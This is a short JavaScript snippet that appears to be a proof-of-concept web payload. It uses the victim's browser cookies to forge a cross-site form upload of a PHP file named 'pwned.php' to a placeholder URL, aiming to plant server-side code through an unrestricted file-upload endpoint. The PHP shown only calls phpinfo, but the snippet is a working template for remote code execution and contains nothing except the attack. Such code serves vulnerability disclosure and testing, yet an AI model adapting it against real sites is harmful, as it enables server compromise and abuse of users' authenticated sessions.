myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});
